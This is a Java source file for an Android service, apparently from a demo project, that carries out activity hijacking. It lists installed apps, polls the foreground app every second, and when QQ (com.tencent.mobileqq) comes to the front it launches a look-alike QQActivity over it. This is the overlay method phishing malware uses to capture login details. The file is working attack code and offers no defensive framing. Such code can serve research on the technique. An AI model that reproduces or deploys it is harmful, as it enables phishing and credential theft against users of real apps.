package com.hijack.demo.hijack;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Handler;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.util.Log;

import com.jaredrummler.android.processes.AndroidProcesses;
import com.jaredrummler.android.processes.models.AndroidAppProcess;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

/**
 * Created by abigbread on 2018/9/4 0030.
 *
 * 劫持服务
 */

public class HijackingService extends Service {
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private boolean hasStart = false;
    //劫持列表
    HashMap<String, Class<?>> classStores = new HashMap<>();
    Handler handler = new Handler();
    Runnable mTask = new Runnable() {
        @Override
        public void run() {
            hijackPackage(getApplication());
            handler.postDelayed(mTask, 1000);
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();
        //获取所有已安装应用 package 信息,已打印
        getItems(getApplication());
    }

    @Override
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
        Log.w("hijacking", "劫持服务开启");
        if (!hasStart){
            //添加想要劫持的应用
            classStores.put("com.tencent.mobileqq", QQActivity.class);
            handler.postDelayed(mTask, 1000);
            Log.w("hijacking", "定时劫持任务开始执行");
            hasStart = true;
        }

    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.w("hijacking", "劫持服务停止");
        hasStart = false;
        HijackingApplication.clearProgressHijacked();
        handler.removeCallbacks(mTask);
        Log.w("hijacking", "定时劫持任务停止");
    }

    //获取已安装的应用信息
    public ArrayList<HashMap<String, Object>> getItems(Context context) {
        PackageManager pckMan = context.getPackageManager();
        ArrayList<HashMap<String, Object>> items = new ArrayList<HashMap<String, Object>>();
        List<PackageInfo> packageInfo = pckMan.getInstalledPackages(0);
        Log.w("hijacking", "------------打印已安装应用信息-----------------");
        for (PackageInfo pInfo : packageInfo) {
            HashMap<String, Object> item = new HashMap<String, Object>();
            Log.w("hijacking", "-----------------------------");
            item.put("appimage", pInfo.applicationInfo.loadIcon(pckMan));
            Log.w("hijacking", "appimage-->"+pInfo.applicationInfo.loadIcon(pckMan));

            item.put("packageName", pInfo.packageName);
            Log.w("hijacking", "packageName-->"+pInfo.packageName);

            item.put("versionCode", pInfo.versionCode);
            Log.w("hijacking", "versionCode-->"+pInfo.versionCode);

            item.put("versionName", pInfo.versionName);
            Log.w("hijacking", "versionName-->"+pInfo.versionName);

            item.put("appName", pInfo.applicationInfo.loadLabel(pckMan).toString());
            Log.w("hijacking", "appName-->"+pInfo.applicationInfo.loadLabel(pckMan).toString());
            Log.w("hijacking", "-----------------------------");
            items.add(item);
        }
        Log.w("hijacking", "-------------打印已安装应用信息完毕----------------");

        return items;
    }

    private void hijackPackage(Context context){
        //获取一个在前台运行应用的 List
        List<AndroidAppProcess> runningForegroundApps = AndroidProcesses.getRunningForegroundApps(context);
        if (runningForegroundApps.size() > 0) {

            Log.w("hijacking", "正在劫持");

            for (AndroidAppProcess androidAppProcess : runningForegroundApps){
                String packageStr = androidAppProcess.getPackageName();
                //如果已经劫持过当前应用，则不继续劫持
                if (!HijackingApplication.hasProgressBeHijacked(packageStr)){
                    //前台运行的应用是否在劫持列表中
                    if (classStores.containsKey(packageStr)){
                        //已经劫持过应用添加到 HijackingApplication
                        HijackingApplication.addProgressHijacked(packageStr);
                        Log.w("hijacking", "已经劫持-->"+packageStr);

                        Intent jackingIsComing = new Intent(getBaseContext(), classStores.get(packageStr));
                        jackingIsComing.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        getApplication().startActivity(jackingIsComing);
                        break;
                    }
                }
            }

            Log.w("hijacking", "一次劫持结束");

        }
    }
}
